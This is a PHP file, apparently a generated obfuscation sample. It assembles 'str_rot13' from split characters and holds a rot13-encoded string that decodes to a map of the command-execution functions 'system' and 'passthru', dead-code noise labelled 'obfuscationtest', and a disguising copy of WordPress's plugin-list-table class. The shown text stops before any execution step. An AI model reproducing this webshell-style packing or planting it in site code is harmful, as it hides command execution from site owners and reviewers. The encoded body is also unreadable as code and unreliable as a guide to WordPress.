<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Cyhtvaf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat vafgnyyrq cyhtvaf va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Cyhtvaf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {
	/**
	 * Jurgure gb fubj gur nhgb-hcqngrf HV.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine obby Gehr vs nhgb-hcqngrf HV vf gb or fubja, snyfr bgurejvfr.
	 */
	cebgrpgrq $fubj_nhgbhcqngrf = gehr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @tybony fgevat $fgnghf
	 * @tybony vag    $cntr
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		tybony $fgnghf, $cntr;

		cnerag::__pbafgehpg(
			neenl(
				'cyheny' => 'cyhtvaf',
				'fperra' => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);

		$nyybjrq_fgnghfrf = neenl( 'npgvir', 'vanpgvir', 'erpragyl_npgvingrq', 'hctenqr', 'zhfghfr', 'qebcvaf', 'frnepu', 'cnhfrq', 'nhgb-hcqngr-ranoyrq', 'nhgb-hcqngr-qvfnoyrq' );

		$fgnghf = 'nyy';
		vs ( vffrg( $_ERDHRFG['cyhtva_fgnghf'] ) && va_neenl( $_ERDHRFG['cyhtva_fgnghf'], $nyybjrq_fgnghfrf, gehr ) ) {
			$fgnghf = $_ERDHRFG['cyhtva_fgnghf'];
		}

		vs ( vffrg( $_ERDHRFG['f'] ) ) {
			$_FREIRE['ERDHRFG_HEV'] = nqq_dhrel_net( 'f', jc_hafynfu( $_ERDHRFG['f'] ) );
		}

		$cntr = $guvf->trg_cntrahz();

		$guvf->fubj_nhgbhcqngrf = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'cyhtva' )
			&& pheerag_hfre_pna( 'hcqngr_cyhtvaf' )
			&& ( ! vf_zhygvfvgr() || $guvf->fperra->va_nqzva( 'argjbex' ) );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_gnoyr_pynffrf() {
		erghea neenl( 'jvqrsng', $guvf->_netf['cyheny'] );
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'npgvingr_cyhtvaf' );
	}

	/**
	 * @tybony fgevat $fgnghf
	 * @tybony neenl  $cyhtvaf
	 * @tybony neenl  $gbgnyf
	 * @tybony vag    $cntr
	 * @tybony fgevat $beqreol
	 * @tybony fgevat $beqre
	 * @tybony fgevat $f
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $fgnghf, $cyhtvaf, $gbgnyf, $cntr, $beqreol, $beqre, $f;

		$beqreol = ! rzcgl( $_ERDHRFG['beqreol'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['beqreol'] ) : '';
		$beqre   = ! rzcgl( $_ERDHRFG['beqre'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['beqre'] ) : '';

		/**
		 * Svygref gur shyy neenl bs cyhtvaf gb yvfg va gur Cyhtvaf yvfg gnoyr.
		 *
		 * @fvapr 3.0.0
		 *
		 * @frr trg_cyhtvaf()
		 *
		 * @cnenz neenl $nyy_cyhtvaf Na neenl bs cyhtvaf gb qvfcynl va gur yvfg gnoyr.
		 */
		$nyy_cyhtvaf = nccyl_svygref( 'nyy_cyhtvaf', trg_cyhtvaf() );

		$cyhtvaf = neenl(
			'nyy'                => $nyy_cyhtvaf,
			'frnepu'             => neenl(),
			'npgvir'             => neenl(),
			'vanpgvir'           => neenl(),
			'erpragyl_npgvingrq' => neenl(),
			'hctenqr'            => neenl(),
			'zhfghfr'            => neenl(),
			'qebcvaf'            => neenl(),
			'cnhfrq'             => neenl(),
		);
		vs ( $guvf->fubj_nhgbhcqngrf ) {
			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_cyhtvaf', neenl() );

			$cyhtvaf['nhgb-hcqngr-ranoyrq']  = neenl();
			$cyhtvaf['nhgb-hcqngr-qvfnoyrq'] = neenl();
		}

		$fperra = $guvf->fperra;

		vs ( ! vf_zhygvfvgr() || ( $fperra->va_nqzva( 'argjbex' ) && pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) ) {

			/**
			 * Svygref jurgure gb qvfcynl gur nqinaprq cyhtvaf yvfg gnoyr.
			 *
			 * Gurer ner gjb glcrf bs nqinaprq cyhtvaf - zhfg-hfr naq qebc-vaf -
			 * juvpu pna or hfrq va n fvatyr fvgr be Zhygvfvgr argjbex.
			 *
			 * Gur $glcr cnenzrgre nyybjf lbh gb qvssreragvngr orgjrra gur glcr bs nqinaprq
			 * cyhtvaf gb svygre gur qvfcynl bs. Pbagrkgf vapyhqr 'zhfghfr' naq 'qebcvaf'.
			 *
			 * @fvapr 3.0.0
			 *
			 * @cnenz obby   $fubj Jurgure gb fubj gur nqinaprq cyhtvaf sbe gur fcrpvsvrq
			 *                     cyhtva glcr. Qrsnhyg gehr.
			 * @cnenz fgevat $glcr Gur cyhtva glcr. Npprcgf 'zhfghfr', 'qebcvaf'.
			 */
			vs ( nccyl_svygref( 'fubj_nqinaprq_cyhtvaf', gehr, 'zhfghfr' ) ) {
				$cyhtvaf['zhfghfr'] = trg_zh_cyhtvaf();
			}

			/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-cyhtvaf-yvfg-gnoyr.cuc */
			vs ( nccyl_svygref( 'fubj_nqinaprq_cyhtvaf', gehr, 'qebcvaf' ) ) {
				$cyhtvaf['qebcvaf'] = trg_qebcvaf();
			}

			vs ( pheerag_hfre_pna( 'hcqngr_cyhtvaf' ) ) {
				$pheerag = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );
				sbernpu ( (neenl) $cyhtvaf['nyy'] nf $cyhtva_svyr => $cyhtva_qngn ) {
					vs ( vffrg( $pheerag->erfcbafr[ $cyhtva_svyr ] ) ) {
						$cyhtvaf['nyy'][ $cyhtva_svyr ]['hcqngr'] = gehr;
						$cyhtvaf['hctenqr'][ $cyhtva_svyr ]       = $cyhtvaf['nyy'][ $cyhtva_svyr ];
					}
				}
			}
		}

		vs ( ! $fperra->va_nqzva( 'argjbex' ) ) {
			$fubj = pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' );
			/**
			 * Svygref jurgure gb qvfcynl argjbex-npgvir cyhtvaf nybatfvqr cyhtvaf npgvir sbe gur pheerag fvgr.
			 *
			 * Guvf nyfb pbagebyf gur qvfcynl bs vanpgvir argjbex-bayl cyhtvaf (cyhtvaf jvgu
			 * \"Argjbex: gehr\" va gur cyhtva urnqre).
			 *
			 * Cyhtvaf pnaabg or argjbex-npgvingrq be argjbex-qrnpgvingrq sebz guvf fperra.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz obby $fubj Jurgure gb fubj argjbex-npgvir cyhtvaf. Qrsnhyg vf jurgure gur pheerag
			 *                   hfre pna znantr argjbex cyhtvaf (vr. n Fhcre Nqzva).
			 */
			$fubj_argjbex_npgvir = nccyl_svygref( 'fubj_argjbex_npgvir_cyhtvaf', $fubj );
		}

		vs ( $fperra->va_nqzva( 'argjbex' ) ) {
			$erpragyl_npgvingrq = trg_fvgr_bcgvba( 'erpragyl_npgvingrq', neenl() );
		} ryfr {
			$erpragyl_npgvingrq = trg_bcgvba( 'erpragyl_npgvingrq', neenl() );
		}

		sbernpu ( $erpragyl_npgvingrq nf $xrl => $gvzr ) {
			vs ( $gvzr + JRRX_VA_FRPBAQF < gvzr() ) {
				hafrg( $erpragyl_npgvingrq[ $xrl ] );
			}
		}

		vs ( $fperra->va_nqzva( 'argjbex' ) ) {
			hcqngr_fvgr_bcgvba( 'erpragyl_npgvingrq', $erpragyl_npgvingrq );
		} ryfr {
			hcqngr_bcgvba( 'erpragyl_npgvingrq', $erpragyl_npgvingrq, snyfr );
		}

		$cyhtva_vasb = trg_fvgr_genafvrag( 'hcqngr_cyhtvaf' );

		sbernpu ( (neenl) $cyhtvaf['nyy'] nf $cyhtva_svyr => $cyhtva_qngn ) {
			// Rkgen vasb vs xabja. neenl_zretr() rafherf $cyhtva_qngn unf cerprqrapr vs xrlf pbyyvqr.
			vs ( vffrg( $cyhtva_vasb->erfcbafr[ $cyhtva_svyr ] ) ) {
				$cyhtva_qngn = neenl_zretr( (neenl) $cyhtva_vasb->erfcbafr[ $cyhtva_svyr ], neenl( 'hcqngr-fhccbegrq' => gehr ), $cyhtva_qngn );
			} ryfrvs ( vffrg( $cyhtva_vasb->ab_hcqngr[ $cyhtva_svyr ] ) ) {
				$cyhtva_qngn = neenl_zretr( (neenl) $cyhtva_vasb->ab_hcqngr[ $cyhtva_svyr ], neenl( 'hcqngr-fhccbegrq' => gehr ), $cyhtva_qngn );
			} ryfrvs ( rzcgl( $cyhtva_qngn['hcqngr-fhccbegrq'] ) ) {
				$cyhtva_qngn['hcqngr-fhccbegrq'] = snyfr;
			}

			/*
			 * Perngr gur cnlybnq gung'f hfrq sbe gur nhgb_hcqngr_cyhtva svygre.
			 * Guvf vf gur fnzr qngn pbagnvarq jvguva $cyhtva_vasb->(erfcbafr|ab_hcqngr) ubjrire
			 * abg nyy cyhtvaf jvyy or pbagnvarq va gubfr xrlf, guvf nibvqf harkcrpgrq jneavatf.
			 */
			$svygre_cnlybnq = neenl(
				'vq'            => $cyhtva_svyr,
				'fyht'          => '',
				'cyhtva'        => $cyhtva_svyr,
				'arj_irefvba'   => '',
				'hey'           => '',
				'cnpxntr'       => '',
				'vpbaf'         => neenl(),
				'onaaref'       => neenl(),
				'onaaref_egy'   => neenl(),
				'grfgrq'        => '',
				'erdhverf_cuc'  => '',
				'pbzcngvovyvgl' => arj fgqPynff(),
			);

			$svygre_cnlybnq = (bowrpg) jc_cnefr_netf( $cyhtva_qngn, $svygre_cnlybnq );

			$nhgb_hcqngr_sbeprq = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'cyhtva', ahyy, $svygre_cnlybnq );

			vs ( ! vf_ahyy( $nhgb_hcqngr_sbeprq ) ) {
				$cyhtva_qngn['nhgb-hcqngr-sbeprq'] = $nhgb_hcqngr_sbeprq;
			}

			$cyhtvaf['nyy'][ $cyhtva_svyr ] = $cyhtva_qngn;
			// Znxr fher gung $cyhtvaf['hctenqr'] nyfb erprvirf gur rkgen vasb fvapr vg vf hfrq ba ?cyhtva_fgnghf=hctenqr.
			vs ( vffrg( $cyhtvaf['hctenqr'][ $cyhtva_svyr ] ) ) {
				$cyhtvaf['hctenqr'][ $cyhtva_svyr ] = $cyhtva_qngn;
			}

			// Svygre vagb vaqvivqhny frpgvbaf.
			vs ( vf_zhygvfvgr() && ! $fperra->va_nqzva( 'argjbex' ) && vf_argjbex_bayl_cyhtva( $cyhtva_svyr ) && ! vf_cyhtva_npgvir( $cyhtva_svyr ) ) {
				vs ( $fubj_argjbex_npgvir ) {
					// Ba gur aba-argjbex fperra, fubj vanpgvir argjbex-bayl cyhtvaf vs nyybjrq.
					$cyhtvaf['vanpgvir'][ $cyhtva_svyr ] = $cyhtva_qngn;
				} ryfr {
					// Ba gur aba-argjbex fperra, svygre bhg argjbex-bayl cyhtvaf nf ybat nf gurl'er abg vaqvivqhnyyl npgvir.
					hafrg( $cyhtvaf['nyy'][ $cyhtva_svyr ] );
				}
			} ryfrvs ( ! $fperra->va_nqzva( 'argjbex' ) && vf_cyhtva_npgvir_sbe_argjbex( $cyhtva_svyr ) ) {
				vs ( $fubj_argjbex_npgvir ) {
					// Ba gur aba-argjbex fperra, fubj argjbex-npgvir cyhtvaf vs nyybjrq.
					$cyhtvaf['npgvir'][ $cyhtva_svyr ] = $cyhtva_qngn;
				} ryfr {
					// Ba gur aba-argjbex fperra, svygre bhg argjbex-npgvir cyhtvaf.
					hafrg( $cyhtvaf['nyy'][ $cyhtva_svyr ] );
				}
			} ryfrvs ( ( ! $fperra->va_nqzva( 'argjbex' ) && vf_cyhtva_npgvir( $cyhtva_svyr ) )
				|| ( $fperra->va_nqzva( 'argjbex' ) && vf_cyhtva_npgvir_sbe_argjbex( $cyhtva_svyr ) ) ) {
				/*
				 * Ba gur aba-argjbex fperra, cbchyngr gur npgvir yvfg jvgu cyhtvaf gung ner vaqvivqhnyyl npgvingrq.
				 * Ba gur argjbex nqzva fperra, cbchyngr gur npgvir yvfg jvgu cyhtvaf gung ner argjbex-npgvingrq.
				 */
				$cyhtvaf['npgvir'][ $cyhtva_svyr ] = $cyhtva_qngn;

				vs ( ! $fperra->va_nqzva( 'argjbex' ) && vf_cyhtva_cnhfrq( $cyhtva_svyr ) ) {
					$cyhtvaf['cnhfrq'][ $cyhtva_svyr ] = $cyhtva_qngn;
				}
			} ryfr {
				vs ( vffrg( $erpragyl_npgvingrq[ $cyhtva_svyr ] ) ) {
					// Cbchyngr gur erpragyl npgvingrq yvfg jvgu cyhtvaf gung unir orra erpragyl npgvingrq.
					$cyhtvaf['erpragyl_npgvingrq'][ $cyhtva_svyr ] = $cyhtva_qngn;
				}
				// Cbchyngr gur vanpgvir yvfg jvgu cyhtvaf gung nera'g npgvingrq.
				$cyhtvaf['vanpgvir'][ $cyhtva_svyr ] = $cyhtva_qngn;
			}

			vs ( $guvf->fubj_nhgbhcqngrf ) {
				$ranoyrq = va_neenl( $cyhtva_svyr, $nhgb_hcqngrf, gehr ) && $cyhtva_qngn['hcqngr-fhccbegrq'];
				vs ( vffrg( $cyhtva_qngn['nhgb-hcqngr-sbeprq'] ) ) {
					$ranoyrq = (obby) $cyhtva_qngn['nhgb-hcqngr-sbeprq'];
				}

				vs ( $ranoyrq ) {
					$cyhtvaf['nhgb-hcqngr-ranoyrq'][ $cyhtva_svyr ] = $cyhtva_qngn;
				} ryfr {
					$cyhtvaf['nhgb-hcqngr-qvfnoyrq'][ $cyhtva_svyr ] = $cyhtva_qngn;
				}
			}
		}

		vs ( fgeyra( $f ) ) {
			$fgnghf            = 'frnepu';
			$cyhtvaf['frnepu'] = neenl_svygre( $cyhtvaf['nyy'], neenl( $guvf, '_frnepu_pnyyonpx' ) );
		}

		/**
		 * Svygref gur neenl bs cyhtvaf sbe gur yvfg gnoyr.
		 *
		 * @fvapr 6.3.0
		 *
		 * @cnenz neenl[] $cyhtvaf Na neenl bs neenlf bs cyhtva qngn, xrlrq ol pbagrkg.
		 */
		$cyhtvaf = nccyl_svygref( 'cyhtvaf_yvfg', $cyhtvaf );

		$gbgnyf = neenl();
		sbernpu ( $cyhtvaf nf $glcr => $yvfg ) {
			$gbgnyf[ $glcr ] = pbhag( $yvfg );
		}

		vs ( rzcgl( $cyhtvaf[ $fgnghf ] ) && ! va_neenl( $fgnghf, neenl( 'nyy', 'frnepu' ), gehr ) ) {
			$fgnghf = 'nyy';
		}

		$guvf->vgrzf = neenl();
		sbernpu ( $cyhtvaf[ $fgnghf ] nf $cyhtva_svyr => $cyhtva_qngn ) {
			// Genafyngr, qba'g nccyl znexhc, fnavgvmr UGZY.
			$guvf->vgrzf[ $cyhtva_svyr ] = _trg_cyhtva_qngn_znexhc_genafyngr( $cyhtva_svyr, $cyhtva_qngn, snyfr, gehr );
		}

		$gbgny_guvf_cntr = $gbgnyf[ $fgnghf ];

		$wf_cyhtvaf = neenl();
		sbernpu ( $cyhtvaf nf $xrl => $yvfg ) {
			$wf_cyhtvaf[ $xrl ] = neenl_xrlf( $yvfg );
		}

		jc_ybpnyvmr_fpevcg(
			'hcqngrf',
			'_jcHcqngrfVgrzPbhagf',
			neenl(
				'cyhtvaf' => $wf_cyhtvaf,
				'gbgnyf'  => jc_trg_hcqngr_qngn(),
			)
		);

		vs ( ! $beqreol ) {
			$beqreol = 'Anzr';
		} ryfr {
			$beqreol = hpsvefg( $beqreol );
		}

		$beqre = fgegbhccre( $beqre );

		hnfbeg( $guvf->vgrzf, neenl( $guvf, '_beqre_pnyyonpx' ) );

		$cyhtvaf_cre_cntr = $guvf->trg_vgrzf_cre_cntr( fge_ercynpr( '-', '_', $fperra->vq . '_cre_cntr' ), 999 );

		$fgneg = ( $cntr - 1 ) * $cyhtvaf_cre_cntr;

		vs ( $gbgny_guvf_cntr > $cyhtvaf_cre_cntr ) {
			$guvf->vgrzf = neenl_fyvpr( $guvf->vgrzf, $fgneg, $cyhtvaf_cre_cntr );
		}

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $gbgny_guvf_cntr,
				'cre_cntr'    => $cyhtvaf_cre_cntr,
			)
		);
	}

	/**
	 * @tybony fgevat $f HEY rapbqrq frnepu grez.
	 *
	 * @cnenz neenl $cyhtva
	 * @erghea obby
	 */
	choyvp shapgvba _frnepu_pnyyonpx( $cyhtva ) {
		tybony $f;

		sbernpu ( $cyhtva nf $inyhr ) {
			vs ( vf_fgevat( $inyhr ) && snyfr !== fgevcbf( fgevc_gntf( $inyhr ), heyqrpbqr( $f ) ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * @tybony fgevat $beqreol
	 * @tybony fgevat $beqre
	 * @cnenz neenl $cyhtva_n
	 * @cnenz neenl $cyhtva_o
	 * @erghea vag
	 */
	choyvp shapgvba _beqre_pnyyonpx( $cyhtva_n, $cyhtva_o ) {
		tybony $beqreol, $beqre;

		$n = $cyhtva_n[ $beqreol ];
		$o = $cyhtva_o[ $beqreol ];

		vs ( $n === $o ) {
			erghea 0;
		}

		vs ( 'QRFP' === $beqre ) {
			erghea fgepnfrpzc( $o, $n );
		} ryfr {
			erghea fgepnfrpzc( $n, $o );
		}
	}

	/**
	 * @tybony neenl $cyhtvaf
	 */
	choyvp shapgvba ab_vgrzf() {
		tybony $cyhtvaf;

		vs ( ! rzcgl( $_ERDHRFG['f'] ) ) {
			$f = rfp_ugzy( heyqrpbqr( jc_hafynfu( $_ERDHRFG['f'] ) ) );

			/* genafyngbef: %f: Cyhtva frnepu grez. */
			cevags( __( 'Ab cyhtvaf sbhaq sbe: %f.' ), '<fgebat>' . $f . '</fgebat>' );

			// Jr nffhzr gung fbzrobql jub pna vafgnyy cyhtvaf va zhygvfvgr vf rkcrevraprq rabhtu gb abg arrq guvf urycre yvax.
			vs ( ! vf_zhygvfvgr() && pheerag_hfre_pna( 'vafgnyy_cyhtvaf' ) ) {
				rpub ' <n uers=\"' . rfp_hey( nqzva_hey( 'cyhtva-vafgnyy.cuc?gno=frnepu&f=' . heyrapbqr( $f ) ) ) . '\">' . __( 'Frnepu sbe cyhtvaf va gur JbeqCerff Cyhtva Qverpgbel.' ) . '</n>';
			}
		} ryfrvs ( ! rzcgl( $cyhtvaf['nyy'] ) ) {
			_r( 'Ab cyhtvaf sbhaq.' );
		} ryfr {
			_r( 'Ab cyhtvaf ner pheeragyl ninvynoyr.' );
		}
	}

	/**
	 * Qvfcynlf gur frnepu obk.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $grkg     Gur 'fhozvg' ohggba ynory.
	 * @cnenz fgevat $vachg_vq VQ nggevohgr inyhr sbe gur frnepu vachg svryq.
	 */
	choyvp shapgvba frnepu_obk( $grkg, $vachg_vq ) {
		vs ( rzcgl( $_ERDHRFG['f'] ) && ! $guvf->unf_vgrzf() ) {
			erghea;
		}

		$vachg_vq = $vachg_vq . '-frnepu-vachg';

		vs ( ! rzcgl( $_ERDHRFG['beqreol'] ) ) {
			rpub '<vachg glcr=\"uvqqra\" anzr=\"beqreol\" inyhr=\"' . rfp_ngge( $_ERDHRFG['beqreol'] ) . '\" />';
		}
		vs ( ! rzcgl( $_ERDHRFG['beqre'] ) ) {
			rpub '<vachg glcr=\"uvqqra\" anzr=\"beqre\" inyhr=\"' . rfp_ngge( $_ERDHRFG['beqre'] ) . '\" />';
		}
		?>
		<c pynff=\"frnepu-obk\">
			<ynory sbe=\"<?cuc rpub rfp_ngge( $vachg_vq ); ?>\"><?cuc rpub $grkg; ?></ynory>
			<vachg glcr=\"frnepu\" vq=\"<?cuc rpub rfp_ngge( $vachg_vq ); ?>\" pynff=\"jc-svygre-frnepu\" anzr=\"f\" inyhr=\"<?cuc _nqzva_frnepu_dhrel(); ?>\" />
			<?cuc fhozvg_ohggba( $grkg, 'uvqr-vs-wf', '', snyfr, neenl( 'vq' => 'frnepu-fhozvg' ) ); ?>
		</c>
		<?cuc
	}

	/**
	 * @tybony fgevat $fgnghf
	 *
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		tybony $fgnghf;

		$pbyhzaf = neenl(
			'po'          => ! va_neenl( $fgnghf, neenl( 'zhfghfr', 'qebcvaf' ), gehr ) ? '<vachg glcr=\"purpxobk\" />' : '',
			'anzr'        => __( 'Cyhtva' ),
			'qrfpevcgvba' => __( 'Qrfpevcgvba' ),
		);

		vs ( $guvf->fubj_nhgbhcqngrf && ! va_neenl( $fgnghf, neenl( 'zhfghfr', 'qebcvaf' ), gehr ) ) {
			$pbyhzaf['nhgb-hcqngrf'] = __( 'Nhgbzngvp Hcqngrf' );
		}

		erghea $pbyhzaf;
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		erghea neenl();
	}

	/**
	 * @tybony neenl $gbgnyf
	 * @tybony fgevat $fgnghf
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $gbgnyf, $fgnghf;

		$fgnghf_yvaxf = neenl();
		sbernpu ( $gbgnyf nf $glcr => $pbhag ) {
			vs ( ! $pbhag ) {
				pbagvahr;
			}

			fjvgpu ( $glcr ) {
				pnfr 'nyy':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _ak(
						'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag,
						'cyhtvaf'
					);
					oernx;
				pnfr 'npgvir':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Npgvir <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Npgvir <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'erpragyl_npgvingrq':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Erpragyl Npgvir <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Erpragyl Npgvir <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'vanpgvir':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Vanpgvir <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Vanpgvir <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'zhfghfr':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Zhfg-Hfr <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Zhfg-Hfr <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'qebcvaf':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Qebc-va <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Qebc-vaf <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'cnhfrq':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Cnhfrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Cnhfrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'hctenqr':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Hcqngr Ninvynoyr <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Hcqngr Ninvynoyr <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'nhgb-hcqngr-ranoyrq':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Nhgb-hcqngrf Ranoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Nhgb-hcqngrf Ranoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
				pnfr 'nhgb-hcqngr-qvfnoyrq':
					/* genafyngbef: %f: Ahzore bs cyhtvaf. */
					$grkg = _a(
						'Nhgb-hcqngrf Qvfnoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						'Nhgb-hcqngrf Qvfnoyrq <fcna pynff=\"pbhag\">(%f)</fcna>',
						$pbhag
					);
					oernx;
			}

			vs ( 'frnepu' !== $glcr ) {
				$fgnghf_yvaxf[ $glcr ] = neenl(
					'hey'     => nqq_dhrel_net( 'cyhtva_fgnghf', $glcr, 'cyhtvaf.cuc' ),
					'ynory'   => fcevags( $grkg, ahzore_sbezng_v18a( $pbhag ) ),
					'pheerag' => $glcr === $fgnghf,
				);
			}
		}

		erghea $guvf->trg_ivrjf_yvaxf( $fgnghf_yvaxf );
	}

	/**
	 * @tybony fgevat $fgnghf
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		tybony $fgnghf;

		$npgvbaf = neenl();

		vs ( 'npgvir' !== $fgnghf ) {
			$npgvbaf['npgvingr-fryrpgrq'] = $guvf->fperra->va_nqzva( 'argjbex' ) ? _k( 'Argjbex Npgvingr', 'cyhtva' ) : _k( 'Npgvingr', 'cyhtva' );
		}

		vs ( 'vanpgvir' !== $fgnghf && 'erprag' !== $fgnghf ) {
			$npgvbaf['qrnpgvingr-fryrpgrq'] = $guvf->fperra->va_nqzva( 'argjbex' ) ? _k( 'Argjbex Qrnpgvingr', 'cyhtva' ) : _k( 'Qrnpgvingr', 'cyhtva' );
		}

		vs ( ! vf_zhygvfvgr() || $guvf->fperra->va_nqzva( 'argjbex' ) ) {
			vs ( pheerag_hfre_pna( 'hcqngr_cyhtvaf' ) ) {
				$npgvbaf['hcqngr-fryrpgrq'] = __( 'Hcqngr' );
			}

			vs ( pheerag_hfre_pna( 'qryrgr_cyhtvaf' ) && ( 'npgvir' !== $fgnghf ) ) {
				$npgvbaf['qryrgr-fryrpgrq'] = __( 'Qryrgr' );
			}

			vs ( $guvf->fubj_nhgbhcqngrf ) {
				vs ( 'nhgb-hcqngr-ranoyrq' !== $fgnghf ) {
					$npgvbaf['ranoyr-nhgb-hcqngr-fryrpgrq'] = __( 'Ranoyr Nhgb-hcqngrf' );
				}
				vs ( 'nhgb-hcqngr-qvfnoyrq' !== $fgnghf ) {
					$npgvbaf['qvfnoyr-nhgb-hcqngr-fryrpgrq'] = __( 'Qvfnoyr Nhgb-hcqngrf' );
				}
			}
		}

		erghea $npgvbaf;
	}

	/**
	 * @tybony fgevat $fgnghf
	 * @cnenz fgevat $juvpu
	 */
	choyvp shapgvba ohyx_npgvbaf( $juvpu = '' ) {
		tybony $fgnghf;

		vs ( va_neenl( $fgnghf, neenl( 'zhfghfr', 'qebcvaf' ), gehr ) ) {
			erghea;
		}

		cnerag::ohyx_npgvbaf( $juvpu );
	}

	/**
	 * @tybony fgevat $fgnghf
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {
		tybony $fgnghf;

		vs ( ! va_neenl( $fgnghf, neenl( 'erpragyl_npgvingrq', 'zhfghfr', 'qebcvaf' ), gehr ) ) {
			erghea;
		}

		rpub '<qvi pynff=\"nyvtayrsg npgvbaf\">';

		vs ( 'erpragyl_npgvingrq' === $fgnghf ) {
			fhozvg_ohggba( __( 'Pyrne Yvfg' ), '', 'pyrne-erprag-yvfg', snyfr );
		} ryfrvs ( 'gbc' === $juvpu && 'zhfghfr' === $fgnghf ) {
			rpub '<c>' . fcevags(
				/* genafyngbef: %f: zh-cyhtvaf qverpgbel anzr. */
				__( 'Svyrf va gur %f qverpgbel ner rkrphgrq nhgbzngvpnyyl.' ),
				'<pbqr>' . fge_ercynpr( NOFCNGU, '/', JCZH_CYHTVA_QVE ) . '</pbqr>'
			) . '</c>';
		} ryfrvs ( 'gbc' === $juvpu && 'qebcvaf' === $fgnghf ) {
			rpub '<c>' . fcevags(
				/* genafyngbef: %f: jc-pbagrag qverpgbel anzr. */
				__( 'Qebc-vaf ner fvatyr svyrf, sbhaq va gur %f qverpgbel, gung ercynpr be raunapr JbeqCerff srngherf va jnlf gung ner abg cbffvoyr sbe genqvgvbany cyhtvaf.' ),
				'<pbqr>' . fge_ercynpr( NOFCNGU, '', JC_PBAGRAG_QVE ) . '</pbqr>'
